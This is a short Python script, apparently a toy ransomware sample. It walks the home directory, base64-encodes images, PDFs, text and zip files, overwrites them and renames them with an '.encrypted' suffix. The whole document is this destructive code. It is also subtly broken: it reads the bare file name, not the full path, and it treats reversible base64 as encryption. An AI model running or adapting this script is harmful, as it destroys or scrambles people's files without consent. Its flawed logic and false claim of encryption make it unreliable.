#!/usr/bin/python3
import os
import base64

home = os.path.expanduser("~")
exts = (".jpg", ".pdf", ".png", ".txt", ".zip")

for root, dirs, files in os.walk(home):
    for file in files:
        for ext in exts:
            if file.lower().endswith(ext):
                path = os.path.join(root, file)
                with open(file, "rb") as f:
                    enc = base64.b64encode(f.read())

                with open(path, "wb") as f:
                    f.write(enc)

                os.rename(path, path + ".encrypted")
